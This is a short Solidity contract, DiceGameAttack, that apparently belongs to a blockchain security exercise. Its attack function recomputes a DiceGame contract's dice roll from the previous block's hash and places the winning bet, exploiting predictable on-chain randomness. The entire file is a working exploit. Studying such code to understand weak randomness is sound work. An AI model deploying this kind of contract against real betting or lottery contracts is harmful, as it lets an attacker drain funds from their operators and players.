// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './DiceGame.sol';

contract DiceGameAttack {

  function attack(address _victim) public returns (bool) {
    DiceGame diceGame = DiceGame(_victim);
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint8 bet = uint8((blockValue % 6) + 1);
    return diceGame.roll(bet);
  }
}
